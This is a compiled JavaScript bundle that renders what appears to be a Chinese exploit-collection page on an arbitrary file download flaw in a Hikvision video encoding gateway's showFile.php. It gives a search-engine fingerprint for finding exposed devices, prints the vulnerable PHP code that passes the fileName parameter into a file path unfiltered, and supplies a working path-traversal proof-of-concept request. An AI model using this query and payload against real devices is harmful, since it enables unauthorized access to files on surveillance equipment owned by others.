(window.webpackJsonp=window.webpackJsonp||[]).push([[309],{1367:function(t,s,a){t.exports=a.p+"assets/img/1630063019704-4b10f55b-d725-4866-b5aa-e73d638b2f27.8499cf19.png"},1368:function(t,s,a){t.exports=a.p+"assets/img/1630063348342-40566a14-18d5-467b-b259-ad3c6888c456.eb432512.png"},2864:function(t,s,a){"use strict";a.r(s);var n=a(64),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"hikvision-视频编码设备接入网关-showfile-php-任意文件下载漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#hikvision-视频编码设备接入网关-showfile-php-任意文件下载漏洞"}},[t._v("#")]),t._v(" HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("海康威视视频接入网关系统在页面"),s("code",[t._v("/serverLog/showFile.php")]),t._v("的参数fileName存在任意文件下载漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("HIKVISION 视频编码设备接入网关")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('title="视频编码设备接入网关"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1367),alt:"img"}})]),t._v(" "),s("p",[t._v("漏洞文件为 "),s("code",[t._v("showFile.php")]),t._v(", 其中 "),s("code",[t._v("参数 fileName")]),t._v(" 没有过滤危险字符，导致可文件遍历下载")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file_name")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'fileName'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file_path")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'../../../log/'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file_name")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fopen")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$file_path")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"r"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("while")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$line")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fgets")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$line")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nl2br")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("htmlentities")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$line")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("ENT_COMPAT")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"utf-8"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'<span style=\"font-size:16px\">'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$line")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'</span>'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\t\t\t\t\t"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fclose")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$fp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br")])]),s("p",[t._v("验证POC")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("serverLog"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("showFile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?fileName"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("web"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("html"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("main"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1368),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);